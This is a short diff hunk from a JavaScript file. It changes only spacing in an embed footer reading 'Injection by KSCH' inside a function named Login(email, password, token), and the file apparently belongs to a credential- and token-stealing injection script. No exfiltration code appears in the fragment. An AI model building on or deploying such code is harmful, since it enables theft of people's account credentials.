@@ -872,7 +872,7 @@ async function Login(email, password, token) {
 												}, ],
 
                     "footer": {
-                        "text": "Injection by KSCH| https://github.com/KSCHdsc"
+                        "text": "Injection by KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
